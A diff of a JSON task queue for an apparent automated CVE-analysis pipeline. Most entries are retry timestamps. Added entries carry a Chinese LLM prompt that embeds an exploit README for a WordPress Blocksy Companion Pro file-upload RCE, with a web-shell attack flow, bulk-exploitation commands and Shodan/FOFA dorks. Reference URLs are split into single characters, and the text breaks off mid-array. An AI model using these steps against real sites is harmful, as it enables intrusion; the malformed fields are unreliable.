@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784878324.9456172,
     "last_attempt": 1784911515.5877585,
-    "next_attempt": 1785024534.7242253,
+    "next_attempt": 1785060231.370413,
     "metadata": {},
     "task_id": "task_CVE-2026-43499_1784878324",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784888355.3174758,
     "last_attempt": 1784911520.24393,
-    "next_attempt": 1785024517.883979,
+    "next_attempt": 1785060240.1966481,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1784888355",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784888364.1364648,
     "last_attempt": 1784911515.5891743,
-    "next_attempt": 1785024525.7220995,
+    "next_attempt": 1785060241.4590554,
     "metadata": {},
     "task_id": "task_CVE-2026-46455_1784888364",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784888369.886524,
     "last_attempt": 1784911525.2253358,
-    "next_attempt": 1785024518.4415867,
+    "next_attempt": 1785060240.264287,
     "metadata": {},
     "task_id": "task_CVE-2025-55182_1784888369",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784895598.8109567,
     "last_attempt": 1784937921.770013,
-    "next_attempt": 1785024512.7107706,
+    "next_attempt": 1785060233.9543262,
     "metadata": {},
     "task_id": "task_CVE-2025-49844_1784895598",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784895603.5608225,
     "last_attempt": 1784991855.14006,
-    "next_attempt": 1785024534.089588,
+    "next_attempt": 1785060238.29672,
     "metadata": {},
     "task_id": "task_CVE-2026-65650_1784895603",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784895610.4968648,
     "last_attempt": 1784963919.9631011,
-    "next_attempt": 1785024512.7278636,
+    "next_attempt": 1785060241.4551818,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1784895610",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784895618.509878,
     "last_attempt": 1784991855.1421075,
-    "next_attempt": 1785024535.3008006,
+    "next_attempt": 1785060238.044358,
     "metadata": {},
     "task_id": "task_CVE-2025-54424_1784895618",
     "required_result_fields": [
@@ -242,7 +242,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784911490.946711,
     "last_attempt": 1784991850.1222763,
-    "next_attempt": 1785024542.9983494,
+    "next_attempt": 1785060227.016357,
     "metadata": {},
     "task_id": "task_CVE-2026-45585_1784911490",
     "required_result_fields": [
@@ -271,7 +271,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784911496.9228945,
     "last_attempt": 1784991855.1524048,
-    "next_attempt": 1785024542.786448,
+    "next_attempt": 1785060237.8844564,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1784911496",
     "required_result_fields": [
@@ -300,7 +300,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784911510.9058595,
     "last_attempt": 1784937921.772144,
-    "next_attempt": 1785024518.0210528,
+    "next_attempt": 1785060234.9629521,
     "metadata": {},
     "task_id": "task_CVE-2026-20896_1784911510",
     "required_result_fields": [
@@ -329,7 +329,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784911515.5841749,
     "last_attempt": 1784991845.1083105,
-    "next_attempt": 1785024518.2023497,
+    "next_attempt": 1785060235.127505,
     "metadata": {},
     "task_id": "task_CVE-2026-33697_1784911515",
     "required_result_fields": [
@@ -358,7 +358,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784911520.2403572,
     "last_attempt": 1784937921.778643,
-    "next_attempt": 1785024520.7650104,
+    "next_attempt": 1785060223.186517,
     "metadata": {},
     "task_id": "task_CVE-2026-7228_1784911520",
     "required_result_fields": [
@@ -387,7 +387,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784911525.2212765,
     "last_attempt": 1784937921.7803724,
-    "next_attempt": 1785024532.418069,
+    "next_attempt": 1785060224.3511138,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1784911525",
     "required_result_fields": [
@@ -416,7 +416,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784911530.1202784,
     "last_attempt": 1784937921.7852814,
-    "next_attempt": 1785024525.4497797,
+    "next_attempt": 1785060233.122736,
     "metadata": {},
     "task_id": "task_CVE-2026-31802_1784911530",
     "required_result_fields": [
@@ -445,7 +445,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784917143.9650772,
     "last_attempt": 1784937921.79126,
-    "next_attempt": 1785024524.7292273,
+    "next_attempt": 1785060239.800042,
     "metadata": {},
     "task_id": "task_CVE-2025-68921_1784917143",
     "required_result_fields": [
@@ -474,7 +474,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784930736.0164297,
     "last_attempt": 1784991855.1542745,
-    "next_attempt": 1785024543.0165055,
+    "next_attempt": 1785060220.1305945,
     "metadata": {},
     "task_id": "task_CVE-2025-66398_1784930736",
     "required_result_fields": [
@@ -503,7 +503,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784930740.7930064,
     "last_attempt": 1784963923.9877293,
-    "next_attempt": 1785024534.6188164,
+    "next_attempt": 1785060236.303444,
     "metadata": {},
     "task_id": "task_CVE-2026-2472_1784930740",
     "required_result_fields": [
@@ -532,7 +532,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784930745.0316749,
     "last_attempt": 1784991850.123837,
-    "next_attempt": 1785024520.127367,
+    "next_attempt": 1785060221.0619888,
     "metadata": {},
     "task_id": "task_CVE-2026-20841_1784930745",
     "required_result_fields": [
@@ -561,7 +561,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784963899.6867228,
     "last_attempt": 1784991860.164143,
-    "next_attempt": 1785024535.6649692,
+    "next_attempt": 1785060218.0848186,
     "metadata": {},
     "task_id": "task_CVE-2026-10097_1784963899",
     "required_result_fields": [
@@ -590,7 +590,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784963903.943397,
     "last_attempt": 1784991860.1660345,
-    "next_attempt": 1785024538.5801084,
+    "next_attempt": 1785060248.2184975,
     "metadata": {},
     "task_id": "task_CVE-2026-6330_1784963903",
     "required_result_fields": [
@@ -619,7 +619,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784963909.9573598,
     "last_attempt": 1784991860.1755495,
-    "next_attempt": 1785024514.345905,
+    "next_attempt": 1785060246.5905693,
     "metadata": {},
     "task_id": "task_CVE-2026-12960_1784963909",
     "required_result_fields": [
@@ -648,7 +648,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784963923.982411,
     "last_attempt": 1784991836.885004,
-    "next_attempt": 1785024493.297062,
+    "next_attempt": 1785060199.6440325,
     "metadata": {},
     "task_id": "task_CVE-2026-41089_1784963923",
     "required_result_fields": [
@@ -677,7 +677,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784972926.8623457,
     "last_attempt": 1785002591.7759418,
-    "next_attempt": 1785024541.8400767,
+    "next_attempt": 1785060241.4737868,
     "metadata": {},
     "task_id": "task_CVE-2026-50522_1784972926",
     "required_result_fields": [
@@ -706,7 +706,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784986099.868605,
     "last_attempt": 1784991841.8969374,
-    "next_attempt": 1785024488.7943335,
+    "next_attempt": 1785060187.708883,
     "metadata": {},
     "task_id": "task_CVE-2026-48908_1784986099",
     "required_result_fields": [
@@ -735,7 +735,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784991826.8731134,
     "last_attempt": 1784991867.4513183,
-    "next_attempt": 1785024492.5883145,
+    "next_attempt": 1785060196.3061252,
     "metadata": {},
     "task_id": "task_CVE-2026-24061_1784991826",
     "required_result_fields": [
@@ -764,7 +764,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784991845.1025524,
     "last_attempt": 1785002586.7561326,
-    "next_attempt": 1785024535.345832,
+    "next_attempt": 1785060240.793281,
     "metadata": {},
     "task_id": "task_CVE-2026-16723_1784991845",
     "required_result_fields": [
@@ -793,7 +793,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784991862.4446132,
     "last_attempt": 1784998772.947409,
-    "next_attempt": 1785024481.0324605,
+    "next_attempt": 1785060188.0095294,
     "metadata": {},
     "task_id": "task_CVE-2026-41651_1784991862",
     "required_result_fields": [
@@ -822,7 +822,7 @@
     "last_error": "API返回空结果",
     "created_at": 1784998773.4544802,
     "last_attempt": 1785010304.5949252,
-    "next_attempt": 1785024491.1766458,
+    "next_attempt": 1785060192.0475214,
     "metadata": {},
     "task_id": "task_CVE-2026-32194_1784998773",
     "required_result_fields": [
@@ -851,7 +851,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785002561.5071912,
     "last_attempt": 1785010309.6046524,
-    "next_attempt": 1785024492.596021,
+    "next_attempt": 1785060199.369025,
     "metadata": {},
     "task_id": "task_CVE-2026-54121_1785002561",
     "required_result_fields": [
@@ -880,7 +880,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785002571.7419994,
     "last_attempt": 1785016636.346206,
-    "next_attempt": 1785024493.8732498,
+    "next_attempt": 1785060195.5228148,
     "metadata": {},
     "task_id": "task_CVE-2026-8838_1785002571",
     "required_result_fields": [
@@ -909,9 +909,96 @@
     "last_error": "API返回空结果",
     "created_at": 1785010304.5872898,
     "last_attempt": 1785024472.170745,
-    "next_attempt": 1785024509.013904,
+    "next_attempt": 1785060195.8279147,
     "metadata": {},
     "task_id": "task_CVE-2026-40901_1785010304",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-58480",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-58480\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"Blocksy Companion Pro plugin for WordPress before 2.1.47 contains an unauthenticated arbitrary file upload vulnerability that allows attackers to upload executable files by bypassing extension validation in the save_attachments function exposed through the Advanced Reviews feature. Attackers can exploit the Custom Fonts extension's flawed strpos() substring check by uploading double-extension filenames such as shell.woff2.php, causing the validation to pass on the substring match while the web server executes the file as PHP, achieving remote code execution.\", \"\\u6807\\u9898: Blocksy Companion Pro \\u63d2\\u4ef6 WordPress \\u4efb\\u610f\\u6587\\u4ef6\\u4e0a\\u4f20\\u6f0f\\u6d1e\"], \"published_date\": \"2026-07-08T14:17:19.977\", \"last_modified_date\": \"2026-07-08T15:28:15.630\", \"cvss_score\": 9.8, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"p\", \"a\", \"t\", \"c\", \"h\", \"s\", \"t\", \"a\", \"c\", \"k\", \".\", \"c\", \"o\", \"m\", \"/\", \"d\", \"a\", \"t\", \"a\", \"b\", \"a\", \"s\", \"e\", \"/\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"/\", \"b\", \"l\", \"o\", \"c\", \"k\", \"s\", \"y\", \"-\", \"c\", \"o\", \"m\", \"p\", \"a\", \"n\", \"i\", \"o\", \"n\", \"/\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"y\", \"/\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \"-\", \"b\", \"l\", \"o\", \"c\", \"k\", \"s\", \"y\", \"-\", \"c\", \"o\", \"m\", \"p\", \"a\", \"n\", \"i\", \"o\", \"n\", \"-\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"-\", \"2\", \"-\", \"1\", \"-\", \"4\", \"6\", \"-\", \"u\", \"n\", \"a\", \"u\", \"t\", \"h\", \"e\", \"n\", \"t\", \"i\", \"c\", \"a\", \"t\", \"e\", \"d\", \"-\", \"a\", \"r\", \"b\", \"i\", \"t\", \"r\", \"a\", \"r\", \"y\", \"-\", \"f\", \"i\", \"l\", \"e\", \"-\", \"u\", \"p\", \"l\", \"o\", \"a\", \"d\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"y\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \"/\", \"b\", \"l\", \"o\", \"c\", \"k\", \"s\", \"y\", \"-\", \"c\", \"o\", \"m\", \"p\", \"a\", \"n\", \"i\", \"o\", \"n\", \"/\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"v\", \"u\", \"l\", \"n\", \"c\", \"h\", \"e\", \"c\", \"k\", \".\", \"c\", \"o\", \"m\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"b\", \"l\", \"o\", \"c\", \"k\", \"s\", \"y\", \"-\", \"c\", \"o\", \"m\", \"p\", \"a\", \"n\", \"i\", \"o\", \"n\", \"-\", \"p\", \"r\", \"o\", \"-\", \"u\", \"n\", \"a\", \"u\", \"t\", \"h\", \"e\", \"n\", \"t\", \"i\", \"c\", \"a\", \"t\", \"e\", \"d\", \"-\", \"f\", \"i\", \"l\", \"e\", \"-\", \"u\", \"p\", \"l\", \"o\", \"a\", \"d\", \"-\", \"v\", \"i\", \"a\", \"-\", \"s\", \"a\", \"v\", \"e\", \"-\", \"a\", \"t\", \"t\", \"a\", \"c\", \"h\", \"m\", \"e\", \"n\", \"t\", \"s\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"w\", \"o\", \"r\", \"d\", \"f\", \"e\", \"n\", \"c\", \"e\", \".\", \"c\", \"o\", \"m\", \"/\", \"t\", \"h\", \"r\", \"e\", \"a\", \"t\", \"-\", \"i\", \"n\", \"t\", \"e\", \"l\", \"/\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"/\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \"-\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \"/\", \"b\", \"l\", \"o\", \"c\", \"k\", \"s\", \"y\", \"-\", \"c\", \"o\", \"m\", \"p\", \"a\", \"n\", \"i\", \"o\", \"n\", \"/\", \"b\", \"l\", \"o\", \"c\", \"k\", \"s\", \"y\", \"-\", \"c\", \"o\", \"m\", \"p\", \"a\", \"n\", \"i\", \"o\", \"n\", \"-\", \"2\", \"1\", \"4\", \"6\", \"-\", \"u\", \"n\", \"a\", \"u\", \"t\", \"h\", \"e\", \"n\", \"t\", \"i\", \"c\", \"a\", \"t\", \"e\", \"d\", \"-\", \"a\", \"r\", \"b\", \"i\", \"t\", \"r\", \"a\", \"r\", \"y\", \"-\", \"f\", \"i\", \"l\", \"e\", \"-\", \"u\", \"p\", \"l\", \"o\", \"a\", \"d\", \"-\", \"v\", \"i\", \"a\", \"-\", \"b\", \"l\", \"c\", \"-\", \"r\", \"e\", \"v\", \"i\", \"e\", \"w\", \"-\", \"i\", \"m\", \"a\", \"g\", \"e\", \"s\", \"-\", \"p\", \"a\", \"r\", \"a\", \"m\", \"e\", \"t\", \"e\", \"r\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2026-58480\n [description] 3 weeks ago - Blocksy Companion Pro plugin for WordPress before 2.1.47 contains an unauthenticated arbitrary file upload vulnerability that allows attackers to upload executable files by bypassing extension validation in the save_attachments function exposed through the Advanced Reviews feature. Attackers can exploit the Custom Fonts extension's flawed strpos() substring check by uploading double-extension filenames such as shell.woff2.php, causing the validation to pass on the substring match while the web server executes the file as PHP, achieving remote code execution.\n [link] https://www.tenable.com/cve/CVE-2026-58480\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - SecureWithUmer/CVE-2026-PoCs: A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026. · GitHub\n [description] A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026. - SecureWithUmer/CVE-2026-PoCs\n [link] https://github.com/SecureWithUmer/CVE-2026-PoCs\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - Unclecheng-li/poc-lab: Recent CVE PoC & reproduction scripts. Focused on high-severity vulnerabilities across Linux kernel, Windows, macOS and more. · GitHub\n [description] 1 month ago - Directories are organized by CVE identifier (e.g. CVE-2026-31431/). When a vulnerability has no assigned CVE, use its public name (e.g.\n [link] https://github.com/Unclecheng-li/poc-lab\n [webpage 2 end]\n[webpage 3 begin] [title] GitHub - zulloper/cve-poc: CVE POC repo 자동 수집기 · GitHub\n [description] Automated exploit chain for CVE-2026-63030 / CVE-2026-60137 — unauthenticated blind SQLi via WordPre...\n [link] https://github.com/zulloper/cve-poc\n [webpage 3 end]\n[webpage 4 begin] [title] GitHub - XZ1r0/cve-2026-poc-collection: CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs · GitHub\n [description] CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs - XZ1r0/cve-2026-poc-collection\n [link] https://github.com/XZ1r0/cve-2026-poc-collection\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/2eddb8cfd73dbb0f8cad6a8817cf9880/README.md\n---\n<p align=\"center\">\n  <img src=\"https://img.shields.io/badge/python-3.8+-3776AB?style=flat-square&logo=python&logoColor=white\">\n  <img src=\"https://img.shields.io/badge/CVE-2026--58480-CC0000?style=flat-square\">\n  <img src=\"https://img.shields.io/badge/CVSS-9.8_CRITICAL-CC0000?style=flat-square\">\n  <img src=\"https://img.shields.io/badge/license-MIT-97CA00?style=flat-square\">\n</p>\n\n<h3 align=\"center\">CVE-2026-58480 — Blocksy Companion Pro Unauthenticated File Upload RCE</h3>\n<h4 align=\"center\">Advanced Reviews → save_attachments → Custom Fonts strpos() Bypass → shell.woff2.php</h4>\n\n---\n\n## Overview\n\n**CVE-2026-58480** (also tracked as **CVE-2026-15158**) is a critical (CVSS 9.8) unauthenticated arbitrary file upload vulnerability in **Blocksy Companion Pro** < 2.1.47 — the premium addon for the Blocksy WordPress theme (300,000+ active installs).\n\nThe `save_attachments` AJAX handler in the **Advanced Reviews** feature (part of WooCommerce Extra) accepts file uploads without authentication. The **Custom Fonts** extension validates uploads via `strpos()` substring check for `.woff2` / `.ttf` — not the actual file extension. Attackers bypass this with double-extension filenames like `shell.woff2.php`: `.woff2` matches the substring check, `.php` executes on the server.\n\n### Affected Versions\n\n| Version | Status |\n|---|---|\n| < 2.1.47 | Vulnerable |\n| 2.1.47+ | Patched |\n\n> **Requirements:** Premium license with **WooCommerce Extra** (Advanced Reviews) AND **Custom Fonts** extensions active. The free `blocksy-companion` plugin does not contain the vulnerable code paths.\n\n---\n\n## Vulnerability Mechanism\n\n### Root Cause\n\nThe Custom Fonts extension registers a `wp_check_filetype_and_ext` filter that validates filenames using `strpos()` — a substring match — instead of checking the actual file extension via `PATHINFO_EXTENSION`:\n\n```php\n// framework/premium/extensions/custom-fonts/extension.php#L137 (reconstructed)\nadd_filter('wp_check_filetype_and_ext', function($data, $file, $filename, $mimes, $real_mime) {\n    if (strpos($filename, '.woff2') !== false || \n        strpos($filename, '.ttf') !== false) {\n        $data['ext'] = 'woff2';\n        $data['type'] = 'font/woff2';\n    }\n    return $data;\n}, 10, 5);\n```\n\nThe `save_attachments` function in Advanced Reviews calls standard WordPress upload handling, which invokes this filter. A file named `shell.woff2.php` passes because `.woff2` exists as a substring — the filter does NOT verify it's the final extension.\n\n### Attack Flow\n\n```\nPOST /wp-admin/admin-ajax.php\n  action=blc_save_review_attachments\n  blc-review-images[] = shell.woff2.php (multipart, PHP payload)\n→ wp_check_filetype_and_ext filter: \".woff2\" found → approved\n→ File saved to wp-content/uploads/YYYY/MM/shell.woff2.php\n→ GET /wp-content/uploads/YYYY/MM/shell.woff2.php?cmd=id\n→ RCE as www-data\n```\n\n### Source Code Locations\n\n| File (Trac) | Line | Purpose |\n|---|---|---|\n| `framework/premium/extensions/custom-fonts/extension.php` | 137 | `strpos()` validation filter |\n| `framework/premium/extensions/woocommerce-extra/features/advanced-reviews/feature.php` | 811 | `save_attachments` handler |\n\n---\n\n## Installation\n\n```bash\ngit clone https://github.com/shinthink/CVE-2026-58480.git\ncd CVE-2026-58480\npip install requests\n```\n\n## Usage\n\n```bash\n# Fingerprint target\npython exploit.py -u https://target.com --check\n\n# Full exploit\npython exploit.py -u https://target.com\n\n# Bulk scan\npython exploit.py -f targets.txt -o shells.txt\n```\n\n---\n\n## FOFA / Shodan\n\n```\nFOFA:   body=\"/wp-content/themes/blocksy/\"\nShodan: http.html:\"blocksy-companion\"\n```\n\n---\n\n## References\n\n- [NVD CVE-2026-58480](https://nvd.nist.gov/vuln/detail/CVE-2026-58480)\n- [OpenCVE CVE-2026-15158](https://app.opencve.io/cve/CVE-2026-15158) — parameter `blc-review-images[]`\n- [FreshySites Technical Analysis](https://freshysites.com/security-bulletins/blocksy-companion-plugin-vulnerability-cve-2026-15158/) — `wp_check_filetype_and_ext` filter\n- [Wordfence Advisory](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/blocksy-companion/blocksy-companion-2146)\n- [SecurityPointBreak](https://securitypointbreak.com/2026/07/08/critical-blocksy-wordpress-plugin-bug-lets-attackers-skip-login-entirely/)\n- [VulnCheck Advisory](https://www.vulncheck.com/advisories/blocksy-companion-pro-unauthenticated-file-upload-via-save-attachments)\n- [WordPress Trac — Custom Fonts](https://plugins.trac.wordpress.org/browser/blocksy-companion/tags/2.1.46/framework/premium/extensions/custom-fonts/extension.php#L137)\n- [WordPress Trac — Advanced Reviews](https://plugins.trac.wordpress.org/browser/blocksy-companion/tags/2.1.46/framework/premium/extensions/woocommerce-extra/features/advanced-reviews/feature.php#L811)\n\n---\n\n## Disclaimer\n\nThis exploit is provided for educational and authorized security research only. Do not use against systems without explicit permission from the owner.\n\n\n---\n/tmp/2eddb8cfd73dbb\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 1,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
+    "created_at": 1785060167.7592418,
+    "last_attempt": 1785060178.282467,
+    "next_attempt": 1785060189.7131524,
+    "metadata": {},
+    "task_id": "task_CVE-2026-58480_1785060167",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-15158",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-15158\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"The Blocksy Companion plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 2.1.46 via the save_attachments function. This is due to the Custom Fonts extension registering a wp_check_filetype_and_ext filter that approves any filename containing .woff2 or .ttf as a substring via strpos() rather than validating that those strings appear as the final extension via PATHINFO_EXTENSION \\u2014 allowing double-extension filenames such as shell.woff2.php to pass MIME validation and be handled as permitted font files. This makes it possible for unauthenticated attackers to upload files that may be executable, which makes remote code execution possible. This vulnerability is only exploitable when the premium version of the plugin (blocksy-companion-pro) is installed with both the WooCommerce Extra (Advanced Reviews) and Custom Fonts extensions active; the free blocksy-companion plugin does not contain the vulnerable code paths.\", \"\\u6807\\u9898: Blocksy Companion \\u4efb\\u610f\\u6587\\u4ef6\\u4e0a\\u4f20\\u6f0f\\u6d1e\"], \"published_date\": \"2026-07-09T10:16:25.370\", \"last_modified_date\": \"2026-07-09T16:19:45.567\", \"cvss_score\": 9.8, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \".\", \"t\", \"r\", \"a\", \"c\", \".\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"b\", \"r\", \"o\", \"w\", \"s\", \"e\", \"r\", \"/\", \"b\", \"l\", \"o\", \"c\", \"k\", \"s\", \"y\", \"-\", \"c\", \"o\", \"m\", \"p\", \"a\", \"n\", \"i\", \"o\", \"n\", \"/\", \"t\", \"a\", \"g\", \"s\", \"/\", \"2\", \".\", \"1\", \".\", \"4\", \"6\", \"/\", \"f\", \"r\", \"a\", \"m\", \"e\", \"w\", \"o\", \"r\", \"k\", \"/\", \"p\", \"r\", \"e\", \"m\", \"i\", \"u\", \"m\", \"/\", \"e\", \"x\", \"t\", \"e\", \"n\", \"s\", \"i\", \"o\", \"n\", \"s\", \"/\", \"c\", \"u\", \"s\", \"t\", \"o\", \"m\", \"-\", \"f\", \"o\", \"n\", \"t\", \"s\", \"/\", \"e\", \"x\", \"t\", \"e\", \"n\", \"s\", \"i\", \"o\", \"n\", \".\", \"p\", \"h\", \"p\", \"#\", \"L\", \"1\", \"3\", \"7\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \".\", \"t\", \"r\", \"a\", \"c\", \".\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"b\", \"r\", \"o\", \"w\", \"s\", \"e\", \"r\", \"/\", \"b\", \"l\", \"o\", \"c\", \"k\", \"s\", \"y\", \"-\", \"c\", \"o\", \"m\", \"p\", \"a\", \"n\", \"i\", \"o\", \"n\", \"/\", \"t\", \"a\", \"g\", \"s\", \"/\", \"2\", \".\", \"1\", \".\", \"4\", \"6\", \"/\", \"f\", \"r\", \"a\", \"m\", \"e\", \"w\", \"o\", \"r\", \"k\", \"/\", \"p\", \"r\", \"e\", \"m\", \"i\", \"u\", \"m\", \"/\", \"e\", \"x\", \"t\", \"e\", \"n\", \"s\", \"i\", \"o\", \"n\", \"s\", \"/\", \"w\", \"o\", \"o\", \"c\", 